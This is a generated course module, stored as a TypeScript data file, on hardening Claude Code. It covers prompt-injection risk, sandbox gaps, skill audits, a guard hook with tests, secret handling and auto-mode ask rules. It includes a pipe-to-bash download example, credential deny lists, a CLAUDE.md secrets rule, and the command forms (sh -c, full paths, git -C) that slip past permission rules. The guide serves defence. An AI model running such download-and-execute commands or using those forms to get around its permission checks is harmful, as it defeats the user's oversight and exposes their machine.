// Generated from module-6-security.md (release/guide) by md2guide.py on 2026-11-28. The words are the module's own;
// edit the markdown and regenerate rather than rewording here.
import type { ModuleContent } from "./types";

export const CONTENT: ModuleContent = {
  "code": "6",
  "slug": "security",
  "title": "Security and supply chain",
  "hero": "TrifectaHero",
  "lede": [
    "What Claude Code can reach on your machine, what the sandbox does and doesn't stop, and how to check other people's skills and plugins before they run as you.",
    "Time: two evenings."
  ],
  "lessons": [
    {
      "id": "the-three-ingredients-of",
      "code": "6.1",
      "title": "The three ingredients of a data leak",
      "sections": [
        {
          "h": "Problem",
          "blocks": [
            {
              "p": "You connected Claude to your email, your notes, and the web. Each connection felt harmless on its own."
            }
          ]
        },
        {
          "h": "Evidence",
          "blocks": [
            {
              "list": [
                "Simon Willison's \"lethal trifecta\": an agent with **access to your private data**, **exposure to untrusted content**, and **the ability to communicate externally**. \"If your agent combines these three features, an attacker can easily trick it into accessing your private data\" ([2025-06-16](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/))",
                "Greshake et al. showed indirect prompt injection against real applications: \"We argue that LLM-Integrated Applications blur the line between data and instructions.\" ([arXiv:2302.12173](https://arxiv.org/abs/2302.12173))",
                "OWASP lists it first among LLM risks: \"Indirect prompt injections occur when an LLM accepts input from external sources, such as websites or files.\" ([LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/))"
              ]
            }
          ]
        },
        {
          "h": "Principle",
          "blocks": [
            {
              "p": "**Never let one session hold all three at once without a gate between them.** Break at least one leg: no private data, no untrusted input, or no way to send anything out."
            }
          ]
        },
        {
          "h": "Implementation",
          "blocks": [
            {
              "p": "For each workflow, fill in this table:"
            },
            {
              "table": {
                "head": [
                  "Workflow",
                  "Private data?",
                  "Untrusted content?",
                  "Can send out?",
                  "Which leg is broken, and how"
                ],
                "rows": [
                  [
                    "Research on the web",
                    "No",
                    "Yes",
                    "Yes (web fetch)",
                    "No private data in this session"
                  ],
                  [
                    "Inbox triage",
                    "Yes",
                    "Yes (incoming email)",
                    "?",
                    "Read-only connector; no send permission"
                  ]
                ]
              }
            },
            {
              "p": "Any row with three \"yes\" answers needs a change before you run it again."
            },
            {
              "figure": "Trifecta"
            }
          ]
        },
        {
          "h": "In production",
          "blocks": [
            {
              "p": "Our progress sync copies lines from the business log into the team's Notion. Those lines can contain text that came from outside: web pages, emails, tool output. So the sync treats the lines strictly as data. The only instructions are fixed text in the hook itself. The lines are cleaned, shortened, and wrapped in a delimiter that changes on every run, so text inside them can't end the data early by copying the delimiter. A line that contains something that looks like an instruction isn't copied, and it's reported instead."
            }
          ]
        },
        {
          "h": "Limits",
          "blocks": [
            {
              "list": [
                "Breaking a leg reduces the risk; it doesn't remove it. Treat anything an agent reads from outside as data.",
                "A read-only connector can't send anything itself. The session can still send what it read through another tool that can, such as web fetch. Count every tool in the session, not just the connector.",
                "A changing delimiter makes injected text harder to pass off as instructions. It doesn't fully stop prompt injection: the model still reads the text."
              ]
            }
          ]
        },
        {
          "h": "Lab",
          "blocks": [
            {
              "p": "Fill in the table for your three most-used workflows. Setup check: no row has three yes answers."
            }
          ]
        }
      ]
    },
    {
      "id": "what-the-sandbox-doesn",
      "code": "6.2",
      "title": "What the sandbox doesn't cover",
      "advanced": true,
      "sections": [
        {
          "h": "Problem",
          "blocks": [
            {
              "p": "You turned on the sandbox and assumed you were safe."
            }
          ]
        },
        {
          "h": "Evidence",
          "blocks": [
            {
              "p": "From the official [sandboxing documentation](https://code.claude.com/docs/en/sandboxing):"
            },
            {
              "list": [
                "\"The sandbox covers shell commands only. Claude's file tools, MCP servers, and hooks run outside it.\"",
                "\"Effective sandboxing requires both filesystem and network isolation.\"",
                "The network proxy decides from the hostname the client sends, without inspecting TLS, so code inside the sandbox can potentially use domain fronting to reach hosts outside your allowlist. Broad entries like `github.com` widen that path.",
                "\"The sandbox runs on macOS, Linux, and WSL2. On native Windows, Claude Code runs commands unsandboxed.\""
              ]
            },
            {
              "p": "From the [settings reference](https://code.claude.com/docs/en/settings): commands listed in `excludedCommands` run outside the sandbox, and \"Exclusion is a convenience, not a security boundary.\""
            },
            {
              "p": "From the [headless documentation](https://code.claude.com/docs/en/headless): `Bash(git diff *)` matches commands that start with `git diff `. Without the space, `Bash(git diff*)` also matches `git diff-index`."
            },
            {
              "figure": "SandboxWall"
            }
          ]
        },
        {
          "h": "Principle",
          "blocks": [
            {
              "p": "**The sandbox is one wall, not the building.** Cover the gaps with permission rules for the file tools, a review of every MCP server, and as few exclusions as possible."
            }
          ]
        },
        {
          "h": "Implementation",
          "blocks": [
            {
              "p": "A starting point for `~/.claude/settings.json`:"
            },
            {
              "code": "{\n  \"sandbox\": {\n    \"enabled\": true,\n    \"failIfUnavailable\": true,\n    \"allowUnsandboxedCommands\": false,\n    \"filesystem\": {\n      \"denyRead\": [\"~/.ssh\", \"~/.aws\", \"~/.gnupg\", \"~/.netrc\", \"~/.docker/config.json\"]\n    },\n    \"network\": {\n      \"allowedDomains\": [\"api.github.com\", \"registry.npmjs.org\", \"pypi.org\", \"files.pythonhosted.org\"]\n    }\n  }\n}",
              "label": "~/.claude/settings.json"
            },
            {
              "list": [
                "`failIfUnavailable`: if the sandbox can't start, don't run commands unsandboxed.",
                "`allowUnsandboxedCommands: false`: Claude can't retry a blocked command outside the sandbox.",
                "When a tool fails in the sandbox, first try `filesystem.allowWrite` or one more allowed domain. Exclude a command from the sandbox only when nothing narrower works, and exclude the narrowest pattern you can."
              ]
            },
            {
              "p": "These settings cover shell commands only. They don't limit Claude's file tools or MCP servers: those need permission rules and a review of each server."
            },
            {
              "p": "Every key above was checked against the settings reference in November 2026."
            }
          ]
        },
        {
          "h": "In production",
          "blocks": [
            {
              "p": "Go-based command-line tools such as `gh` fail certificate checks inside the macOS sandbox, because the sandbox blocks the system's trust service. We hit this in October 2026. The docs offer two answers. One is a setting, `enableWeakerNetworkIsolation`, that opens that trust service to sandboxed commands; the docs reserve it for setups with an intercepting proxy and a custom certificate. The other is to add the tool to `excludedCommands`. We chose the narrower form of the second:"
            },
            {
              "list": [
                "Only the `gh` subcommands we need for issues, pull requests, and CI (`gh issue *`, `gh pr *`, `gh run *`) run outside the sandbox, and the guard hook auto-approves them only on our own repositories. Merges always prompt.",
                "Public GitHub data is read with `curl` inside the sandbox, which verifies certificates normally."
              ]
            }
          ]
        },
        {
          "h": "Limits",
          "blocks": [
            {
              "list": [
                "The sandbox runs on macOS, Linux, and WSL2 only. On Windows, use WSL2."
              ]
            }
          ]
        },
        {
          "h": "Lab",
          "blocks": [
            {
              "p": "Open your settings and list every exclusion and every allowed domain. Setup check: you can say why each one is there, and you've removed at least one you didn't need."
            }
          ]
        },
        {
          "h": "From the kit",
          "blocks": [
            {
              "p": "`kit/claude/settings.example.json`: merge its `sandbox` part into your own `~/.claude/settings.json`. Don't overwrite your file with it. Done when you can say why each exclusion and allowed domain is there."
            }
          ]
        }
      ]
    },
    {
      "id": "audit-every-skill-and",
      "code": "6.3",
      "title": "Audit every skill and plugin before it runs",
      "sections": [
        {
          "h": "Problem",
          "blocks": [
            {
              "p": "A popular post recommends a skill pack with thousands of stars. You install it in one line."
            }
          ]
        },
        {
          "h": "Evidence",
          "blocks": [
            {
              "list": [
                "Anthropic's plugin documentation: \"Whatever the tier, a plugin you install can run code with your user privileges.\" ([Plugins](https://code.claude.com/docs/en/plugins))",
                "Anthropic on skills: \"We recommend installing skills only from trusted sources.\" ([Anthropic Engineering, 2025-10-16](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills))",
                "Snyk scanned 3,984 published agent skills and found critical issues in 534 of them (13.4%), and 76 confirmed malicious payloads. ([Snyk, 2026-02-05](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub)) The article's headline gives a different number from its body; we cite the body."
              ]
            }
          ]
        },
        {
          "h": "Principle",
          "blocks": [
            {
              "p": "**A skill or plugin is code that runs as you. Read it like a contract before you sign.**"
            }
          ]
        },
        {
          "h": "Implementation",
          "blocks": [
            {
              "p": "The audit we use, in order:"
            },
            {
              "list": [
                "**Source.** Who publishes it? Is the repository the one the post links to, not a similarly named fork?",
                "**License.** Can you use it the way you intend? Some popular lists forbid commercial use or modification.",
                "**Install route.** Prefer the plugin marketplace or a plain `git clone` you can read before running. Treat any `curl ... | bash` install as a red flag.",
                "**Read it.** Every `SKILL.md`, every script, every hook it adds. Look for: network calls, writes to your Claude settings, permission-skipping flags, and anything that sends your files to an outside service.",
                "**Pin it.** Record the exact commit you reviewed.",
                "**Record it.** Keep a ledger, and re-review on every update."
              ],
              "ordered": true
            },
            {
              "p": "A ledger can be one Markdown table (the kit has a template at `templates/skills-ledger.md`):"
            },
            {
              "code": "| skill | source | commit | license | reviewed | notes |\n|---|---|---|---|---|---|\n| systematic-debugging | github.com/obra/superpowers | 8ca22db | MIT | 2026-09-27 | No network, no scripts |",
              "label": "templates/skills-ledger.md"
            },
            {
              "figure": "AuditPipeline"
            }
          ]
        },
        {
          "h": "Worked example: a popular second-brain package (reviewed 2026-10-15)",
          "blocks": [
            {
              "p": "[eugeniughelbur/obsidian-second-brain](https://github.com/eugeniughelbur/obsidian-second-brain) is MIT-licensed, actively maintained, and recommended in widely shared tutorials. Our audit found:"
            },
            {
              "table": {
                "head": [
                  "Finding",
                  "Why it matters"
                ],
                "rows": [
                  [
                    "The one-line install pipes a remote script into `bash`",
                    "You run code you haven't read, fetched at install time"
                  ],
                  [
                    "The setup script edits `~/.claude/settings.json`",
                    "A third party changes your permission and hook configuration"
                  ],
                  [
                    "An opt-in background agent runs with permission checks skipped (limited to read, write, edit, and search tools)",
                    "Inside that agent, every permission prompt is gone"
                  ],
                  [
                    "Some commands send vault notes or queries to Gemini, Perplexity, and xAI",
                    "Your private notes leave your machine"
                  ]
                ]
              }
            },
            {
              "p": "None of this is hidden; it's in the repository. That's the point: it's only visible if you read before you install. Our decision would be marketplace install only, with the background agent and the external-service commands left off. The author may have changed things since our review, so check the current version yourself."
            }
          ]
        },
        {
          "h": "In production",
          "blocks": [
            {
              "p": "Every third-party skill we run is listed in one ledger with its source, the commit we reviewed, and its license. We read each `SKILL.md` and its bundled files before installing, and record local patches, for example when we removed a video model from a marketing skill after the provider retired its API."
            }
          ]
        },
        {
          "h": "Limits",
          "blocks": [
            {
              "list": [
                "Reading code takes time, and you can still miss things. Fewer, well-reviewed skills beat many unreviewed ones."
              ]
            }
          ]
        },
        {
          "h": "Lab",
          "blocks": [
            {
              "p": "Audit every skill and plugin you have installed. Setup check: a complete ledger, and at least one you removed or restricted."
            }
          ]
        },
        {
          "h": "From the kit",
          "blocks": [
            {
              "p": "`kit/templates/skills-ledger.md`: copy it into your vault and add one row per skill or plugin. Done when every installed skill and plugin has a row with its source, commit, and license."
            }
          ]
        }
      ]
    },
    {
      "id": "a-guard-hook-and",
      "code": "6.4",
      "title": "A guard hook, and testing the guard",
      "advanced": true,
      "sections": [
        {
          "h": "Problem",
          "blocks": [
            {
              "p": "Claude occasionally reaches for a command that's dangerous: printing a token, reading a key file, piping a download into a shell. Instructions don't reliably stop it."
            }
          ]
        },
        {
          "h": "Evidence",
          "blocks": [
            {
              "list": [
                "Anthropic's best practices list hooks and deny rules as \"Deterministic\": \"Claude Code applies this every time.\" CLAUDE.md instructions are not. ([Best practices for Claude Code](https://code.claude.com/docs/en/best-practices))",
                "A `PreToolUse` hook runs before each tool call and can allow, ask, or deny it. ([Hooks](https://code.claude.com/docs/en/hooks))"
              ]
            }
          ]
        },
        {
          "h": "Principle",
          "blocks": [
            {
              "p": "**Put must-never-happen rules in a hook. Then test the hook like any other code.**"
            },
            {
              "figure": "TextVsStructure"
            }
          ]
        },
        {
          "h": "Implementation",
          "blocks": [
            {
              "p": "A guard hook that's worth having does four things (the kit's `claude/hooks/security-guard.py` does all four):"
            },
            {
              "list": [
                "**Denies** reading credential stores, printing `.env` files, commands that print tokens, permission-skipping flags, and download-and-execute.",
                "**Asks** before changes to Claude's own settings and hooks.",
                [
                  "**Fails closed.** By default, a hook that crashes is treated as a non-blocking error, and the action goes ahead. ([Hooks](https://code.claude.com/docs/en/hooks)) That's the opposite of what a guard needs. Do both of these:",
                  [
                    "In the hook's settings entry, set `\"onFailure\": \"block\"` (Claude Code v2.1.295 or later).",
                    "Inside the script, catch any unexpected error and exit with code 2, which blocks the call."
                  ]
                ]
              ],
              "ordered": true
            },
            {
              "code": "if __name__ == \"__main__\":\n    try:\n        main()\n    except SystemExit:\n        raise\n    except Exception as exc:  # a broken guard must not wave calls through\n        print(f\"guard failed: {exc}\", file=sys.stderr)\n        sys.exit(2)",
              "label": "End of the guard script"
            },
            {
              "list": [
                "**Reads structure, not text.** A rule that matches the raw text `curl ... | sh` will block someone *searching* for that text and miss real variants."
              ],
              "ordered": true,
              "start": 4
            }
          ]
        },
        {
          "h": "In production",
          "blocks": [
            {
              "p": "Our guard did exactly what point 4 warns about. It matched text, so a search for the string \"wget ... | bash\" was refused, while `wget -qO- https://x | sudo -u root bash` got through. We rebuilt the check to parse the command: it follows quoting, pipeline stages, wrappers like `sudo` and `timeout`, substitutions, and the strings passed to `sh -c` and `eval`. When it can't parse a command, it falls back to text rules: commands that look like download-and-execute, a critical operation, `rm`, or `gh` get \"ask\"; `git push` and anything touching credentials, `.env` files, or tokens get \"deny\". An unparseable command that matches none of those gets no decision from the hook, and the sandbox and permission rules decide. And the hook is set to block if it crashes, both in its settings entry and in its own code."
            },
            {
              "p": "The test suite in the kit covers:"
            },
            {
              "table": {
                "head": [
                  "Group",
                  "Expected decision"
                ],
                "rows": [
                  [
                    "20 harmless commands that only mention download-and-execute as text",
                    "Not refused"
                  ],
                  [
                    "33 real download-and-execute attacks",
                    "Refused"
                  ],
                  [
                    "Unparseable commands that look dangerous",
                    "Ask"
                  ],
                  [
                    "Credentials, tokens, `.env`, settings, GitHub, deletes, and critical operations",
                    "The decision each rule requires"
                  ]
                ]
              }
            },
            {
              "p": "The old text-matching version, run against the same harmless and attack lists, refused some of the harmless commands and let some of the attacks through. The rebuilt guard passes the whole suite, and the suite runs in seconds. We run it after every change to the guard."
            }
          ]
        },
        {
          "h": "Limits",
          "blocks": [
            {
              "list": [
                "A hook can't see what a program does after it starts. \"Download a file now, run it later\" passes this check; the sandbox is the boundary for that.",
                "Text rules can always be evaded by rewording. The sandbox and the permission rules remain the real boundary; the hook catches mistakes.",
                "Passing the suite shows the guard handles the cases in it. It doesn't stop a bypass nobody has written a test for yet. Add each new one to the suite when you find it."
              ]
            }
          ]
        },
        {
          "h": "Lab",
          "blocks": [
            {
              "p": "Write five harmless commands and five dangerous ones for your setup, and run them through your guard. Setup check: ten correct decisions."
            }
          ]
        },
        {
          "h": "From the kit",
          "blocks": [
            {
              "p": "`kit/claude/hooks/security-guard.py` and `kit/claude/hooks/test_security_guard.py`: copy both to `~/.claude/hooks/`, and merge the `hooks` part of `kit/claude/settings.example.json` into `~/.claude/settings.json`. If your vault isn't `~/vault`, set `GUARD_VAULT`. Done when `python3 ~/.claude/hooks/test_security_guard.py`, run from your own terminal, passes every case."
            }
          ]
        }
      ]
    },
    {
      "id": "secrets-stay-where-they",
      "code": "6.5",
      "title": "Secrets stay where they are",
      "sections": [
        {
          "h": "Problem",
          "blocks": [
            {
              "p": "Claude needs an API key to finish a task, and the fastest way is to paste it into the chat."
            }
          ]
        },
        {
          "h": "Evidence",
          "blocks": [
            {
              "list": [
                "Local MCP server configuration added with `claude mcp add-json` is stored in `~/.claude.json`, including any key you put in it. For project `.mcp.json` files, the docs support `${VAR}` expansion, so the file can refer to an environment variable instead of holding the key. ([MCP](https://code.claude.com/docs/en/mcp))"
              ]
            }
          ]
        },
        {
          "h": "Principle",
          "blocks": [
            {
              "p": "**Claude works with the names of secrets, never their values.**"
            }
          ]
        },
        {
          "h": "Implementation",
          "blocks": [
            {
              "p": "Add this to your CLAUDE.md:"
            },
            {
              "code": "## Secrets\n- Never read, print, copy, or send SSH keys, cloud credentials, tokens, .env files, browser profiles, or the keychain.\n- Work with variable names, not values. If a value is needed, tell me which variable to set; I'll set it myself.\n- Never paste a key into a command, a URL, or a file. Use environment variables or the tool's own login.",
              "label": "CLAUDE.md"
            },
            {
              "p": "Then back it with the guard hook (Lesson 6.4) and the sandbox's `denyRead` list (Lesson 6.2), because the CLAUDE.md lines are advisory."
            }
          ]
        },
        {
          "h": "In production",
          "blocks": [
            {
              "p": "Our guard denies reading the usual credential locations, printing `.env` files, and commands such as `gh auth token`. It also refuses web requests whose URL contains something that looks like a key, so a secret can't leave inside a query string."
            }
          ]
        },
        {
          "h": "Limits",
          "blocks": [
            {
              "list": [
                "Anything you paste into the chat is in the conversation. Rotate a key you've pasted."
              ]
            }
          ]
        },
        {
          "h": "Lab",
          "blocks": [
            {
              "p": "Search your CLAUDE.md, `.mcp.json`, and shell history for keys. Setup check: none in plain text, and any you found have been rotated."
            }
          ]
        },
        {
          "h": "From the kit",
          "blocks": [
            {
              "p": "`kit/vault/CLAUDE.md` already has this section (12). If you started from it, there's nothing to add. Done when the lab's search finds no key in plain text."
            }
          ]
        }
      ]
    },
    {
      "id": "auto-mode-with-a",
      "code": "6.6",
      "title": "Auto mode, with a hard floor",
      "advanced": true,
      "sections": [
        {
          "h": "Problem",
          "blocks": [
            {
              "p": "Approving every command is slow, so you want auto mode. In recent versions, new terminal sessions already start in it. But in auto mode a classifier model decides most approvals, and you don't want a model to be the only thing between Claude and a production deploy."
            }
          ]
        },
        {
          "h": "Evidence",
          "blocks": [
            {
              "p": "From the official [permission modes](https://code.claude.com/docs/en/permission-modes) and [permissions](https://code.claude.com/docs/en/permissions) documentation:"
            },
            {
              "list": [
                "In auto mode, \"A separate classifier model reviews actions before they run and blocks the ones it judges risky.\" Its default block list includes \"Merging a pull request no human has approved.\"",
                "\"Claude Code doesn't auto-approve the following in any mode, including `bypassPermissions`\": tools matched by an explicit ask rule.",
                "Prompts forced by your ask rules or by a hook are still shown in auto mode.",
                "\"Deny rules block in every mode, including `bypassPermissions`.\"",
                "A Bash rule \"matches the command text Claude writes, after Claude Code splits compound commands and strips wrappers. It doesn't match the same program invoked in a different form.\" So `cd /tmp && git clean -f` still matches `Bash(git clean *)`, but `sh -c '...'`, a full path like `/usr/bin/curl`, or `git -C . push origin main` can fall outside a rule.",
                "If you tell Claude \"don't push\", the classifier honors it, but \"Boundaries are not stored as rules.\" The classifier re-reads them from the conversation, so a boundary can be lost when the conversation is compacted. The docs' answer: \"add a deny rule instead.\"",
                "In auto mode, writes to protected paths, which include Claude's own configuration, go to the classifier."
              ]
            }
          ]
        },
        {
          "h": "Principle",
          "blocks": [
            {
              "p": "**Let the classifier handle routine work. Put a deterministic floor under everything irreversible: ask rules plus a hook, never the classifier alone.**"
            }
          ]
        },
        {
          "h": "Implementation",
          "blocks": [
            {
              "list": [
                "Allow auto mode, but keep bypass mode off: remove `disableAutoMode` if you had set it; keep `\"permissions\": { \"disableBypassPermissionsMode\": \"disable\" }`.",
                "Add `permissions.ask` rules for every irreversible route you have: PR merges (`Bash(gh pr merge*)`, `Bash(gh api*)`, and `mcp__*__*merge*` for any MCP server's merge tools), pushes to `main`/`master`, deploy CLIs, database clients, payment CLIs, secrets, and edits to Claude's own settings and hooks. The kit's `settings.example.json` has a starting list.",
                "Back the rules with the guard hook. Rules don't follow a program invoked in a different form, so `bash -c 'terraform apply'`, `/usr/local/bin/vercel --prod`, or `git -C . push origin main` can fall outside rules written for the plain commands. The kit's guard parses the command and answers \"ask\" for critical operations wherever they appear, including inside `sh -c`, `eval`, and substitutions.",
                "If auto mode is new to you, watch it for a few days before you trust it with more."
              ],
              "ordered": true
            },
            {
              "p": "Then list the routes your rules can't cover, and close them another way:"
            },
            {
              "table": {
                "head": [
                  "Route",
                  "Enforceable by rules?",
                  "How to close it"
                ],
                "rows": [
                  [
                    "`gh pr merge`, `gh api`, MCP merge tools, pushing to main",
                    "Yes",
                    "Ask rules plus the guard"
                  ],
                  [
                    "Clicking \"Merge\" through browser automation",
                    "No",
                    "Don't grant the browser extension access to github.com"
                  ],
                  [
                    "Cloud sessions or cloud scheduled tasks acting through a GitHub app",
                    "No, not from local settings",
                    "Limit what the app's connectors can do"
                  ],
                  [
                    "Raw API calls with a token",
                    "Only indirectly",
                    "Keep tokens out of reach: the guard and the sandbox block reading them"
                  ]
                ]
              }
            },
            {
              "figure": "FloorLanes"
            }
          ]
        },
        {
          "h": "In production",
          "blocks": [
            {
              "p": "We switched on auto mode in October 2026 with exactly this setup: a set of new ask rules, the guard's critical-operations check, and bypass mode still disabled. The guard's suite includes `bash -c 'terraform apply -auto-approve'`, `git -C /tmp/claude/repo push origin master`, `echo \"$(aws sts get-caller-identity)\"`, and `gh api -X PUT .../pulls/8/merge`, all of which must prompt, and `vercel ls`, `terraform plan`, and a search for the text \"terraform apply\", which must not. We kept our default mode at accept-edits until we had watched auto mode in daily use."
            }
          ]
        },
        {
          "h": "Limits",
          "blocks": [
            {
              "list": [
                "Anything not on your ask list is the classifier's call. When you add a new tool or connector that can deploy, pay, send, or change production, add its ask rule first.",
                "Ask rules cover only the commands they name, in the form they name (step 3 above). The guard closes some of the other forms, not every one.",
                "A repository's own project settings take precedence over your user settings for some keys, including the one that turns hooks off. Your user-level ask rules still apply, which is why both layers exist."
              ]
            }
          ]
        },
        {
          "h": "Lab",
          "blocks": [
            {
              "p": "Write down every irreversible action your setup can take. For each, name the rule or hook that forces a prompt, or the other way you've closed it. Setup check: no action whose only protection is the classifier."
            }
          ]
        },
        {
          "h": "From the kit",
          "blocks": [
            {
              "p": "`kit/claude/settings.example.json`: merge its `permissions` part into `~/.claude/settings.json`, then add rules for your own deploy, database, and payment tools. Done when every irreversible action on your list has a rule or the guard behind it."
            }
          ]
        }
      ]
    }
  ]
};
